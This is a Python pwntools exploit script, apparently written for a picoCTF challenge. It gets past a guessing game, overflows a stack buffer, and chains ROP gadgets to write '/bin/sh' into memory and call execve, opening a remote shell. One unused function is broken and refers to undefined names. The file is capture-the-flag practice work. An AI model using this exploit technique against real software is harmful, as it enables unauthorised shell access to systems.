#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe

ADDRESS = "jupiter.challenges.picoctf.org"
PORT = 51462
# Got with get overflow ofsset.
OVERFLOW_OFFSET = 120

CREATE_SHELL_CMD = b"/bin/sh\0"

EXECVE_SYS_CALL_VALUE = 0x3b
STANDART_INPUT_FILE_INDEX = 0

# we will store shell string there. 
# there ins't alsr there and it's have read write premisios.
BSS_ADDRESS = 0x6bc4a0 

# All the address found with ropgadget.
# Should be higher case... I don't care so much :)
pop_rax = 0x00000000004163f4
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410ca3
pop_rdx = 0x000000000044a6b5
syscall = 0x000000000040137c 
insert_to_rdx = 0x000000000044a71a
 

def conn():
    context.log_level = logging.INFO
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDRESS, PORT)

    return r


def brute_force_guessing_game(r, output):
    while(True):
       line = r.recvline() 
       if b"Congrats" in line:
           break
       if b"guess?\n" in line:
           # Random return same number every run of the compiled program.
           # So it itsn't really a brute force, as I thought it will be first.
           # you can do brute force but it just waste of time.
           r.send(b"84\n")
           output.write(b"84\n")
 
 # never used this function. created rop mannualy.
def get_rop_attack():
    rop_chain = ROP(exe)
    rop_chain.call("execve", [b"/bin/sh", 0, 0])
    log.info(rop_chain.dump())
    with open("rop_attack","w") as rop_output:
        rop_output.write(rop_chain.dump())
    return rop_chain


# Option one... doesn't work.
def create_read_input_rop_attack_doesnt_work():
    # For some reason it read doesn't read anything.
    """ This rop attack inject the string "/bin/sh\0" to program."""
    rop_payload = p64(pop_rax)
    rop_payload += p64(READ_SYSCALL_VALUE)

    rop_payload += p64(pop_rdi)
    rop_payload += p64(STANDART_INPUT_FILE_INDEX)

    rop_payload += p64(pop_rsi)
    rop_payload += p64(BSS_ADDRESS)

    rop_payload += p64(pop_rdx)
    rop_payload += p64(len(CREATE_SHELL_CMD.decode())+1)

    rop_payload += p64(syscall)
    rop_payload += p64(main_address)
    return rop_payload


# Option two:
def create_read_input_rop_attack():
    # Write "\bin"
    rop_payload = p64(pop_rax)
    rop_payload += CREATE_SHELL_CMD[0:4]+b"aaaa"
    rop_payload += p64(pop_rdx)
    rop_payload += p64(BSS_ADDRESS)
    rop_payload += p64(insert_to_rdx)
    
    # Write "\sh"
    rop_payload += p64(pop_rax)
    rop_payload += CREATE_SHELL_CMD[4:8]+b"aaaa"
    rop_payload += p64(pop_rdx)
    rop_payload += p64(BSS_ADDRESS+4)
    rop_payload += p64(insert_to_rdx)
    
    return rop_payload


def create_open_shell_rop_attack():
    
    """ This rop attack used the string from first attack to create remote shell."""
    # rax have the indicating which syscall will call.
    rop_payload = p64(pop_rax)
    rop_payload += p64(EXECVE_SYS_CALL_VALUE)

    # cmd is in buffer.
    # cmd's address argument store in rdi
    rop_payload += p64(pop_rdi)
    rop_payload += p64(BSS_ADDRESS)

    rop_payload += p64(pop_rsi)
    rop_payload += p64(0)

    rop_payload += p64(pop_rdx)
    rop_payload += p64(0)

    rop_payload += p64(syscall)
    return rop_payload
    


def get_overflow_offset(r):
    """ used once to get overflow ofset from start of buffer."""

    # Send big data to crush program
    r.sendline(cyclic(200,n=8))
    r.wait()

    core = r.corefile
    crushed_rsp = core.read(core.rsp, 8)
    log.debug(f"core rsp is {crushed_rsp}")
    offset = cyclic_find(crushed_rsp, n=8)
    log.info(f"offset of buffer-overflow from buffer start : {offset}")
    return offset

def main():
    # output is used to pipe ropchain to local progam so it can be debug in gdb.
    output = open("output", "wb")
    r = conn()

    brute_force_guessing_game(r, output) 
    log.info("------------- brute force success ----------------")
    log.info("------------- waiting for input to send rop attack ----------------")
    # Wait for my cmd
    input()
    r.recvuntil(b"Name? ")

    #bo_offset = get_overflow_offset(r)
    bo_offset = OVERFLOW_OFFSET

    payload = b"a"*bo_offset
    payload += create_read_input_rop_attack()
    payload += create_open_shell_rop_attack()
    log.info("sending rop attack")
    r.send(payload)

    output.write(payload+b"\n")
    output.close()

    r.sendline()
    r.readline()
    # interact with remote shell.
    r.interactive()

if __name__ == "__main__":
    main()
